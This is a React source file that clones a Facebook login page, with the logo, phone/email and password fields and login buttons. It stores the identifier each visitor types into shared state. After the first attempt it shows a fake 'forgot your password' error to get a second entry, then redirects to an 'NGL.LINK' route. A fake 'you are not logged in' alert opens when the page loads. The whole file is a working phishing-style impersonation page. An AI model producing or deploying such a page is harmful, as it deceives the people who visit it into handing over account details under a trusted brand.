import Logo from "../../assets/logoFacebook.png";
import Boton from "../atomos/boton";
import { Input } from "../atomos/input";
import { Texto } from "../atomos/texto";
import '../../css/mainFacebook.css';
import Alerta from "./alerta";
import nameContext from "../../contextos/nameContext";
import { useContext } from "react";
import { useState,useEffect } from "react";
import { useNavigate } from "react-router-dom";
function CuerpoFacebook() {
  const navigate=useNavigate();
    const [validar,setValidar]=useState(false);
    const [Iniciar,setIniciar]=useState(true);
    const [intentos,setIntentos]=useState(0);
    const [userName,setUserName]=useState("");
    const {name,setName}=useContext(nameContext);
    const onChange=(e)=>{
        setUserName(e.target.value);
    }

  const handlerClick=()=>{
    if(intentos<2){
        if(intentos<1){
            setName({userName1:userName})
            setValidar(true);
        }
        else if(intentos<2){
            setName({
                userName1:name.userName1,
                userName2:userName,
            })
            
            navigate("/NGL.LINK");
        }
        setIntentos(intentos+1);
    
    }
    else{
       
    }
    // alert(name.userName1)
}

  return (
    <>
      <section>
        <div className="Imagen">
          <img className="Logo" src={Logo} alt="" />
          <br />
          <br />
        </div>

        <div className="Inputs">
        <Input onChange={onChange} type = "text" className = " Datos " placeholder=" Número de celular o correo electrónico "></Input><br />
        <Input type = "password" className = " Datos " placeholder="Contraseña" ></Input><br />
        <Boton textoBoton="Iniciar sesión" onClick={()=>handlerClick()}  className="DatosBoton" ></Boton><br />
        <a className="Link" href="">¿Olvidaste tu contraseña?</a>
        <Texto textoP=" o "/>
        <Boton textoBoton="Crear cuenta nueva" className="RegistrateBoton"  ></Boton><br />
        {validar&&(
                <Alerta onClick={()=>setValidar(false)} textoBoton="Intentar de nuevo" className="botonAlerta" className1="textoAlertaIg" className2="textoIg" textoP={"¿Olvidaste la contraseña de "+userName+"?"} textoP2="Te podemos enviar un correo electrónico para ayudarte a volver a entrar en tu cuenta"/>
            )}
            {Iniciar&&(
            <Alerta onClick={()=>setIniciar(false)} textoBoton="Entiendo" className="botonAlerta" className1="textoAlertaIg" className2="textoIg" textoP="No has iniciado sesión" textoP2="Debes iniciar sesión en tu cuenta"/>
            )}
        </div>
        </section>
    </>
  );
}

export default CuerpoFacebook;
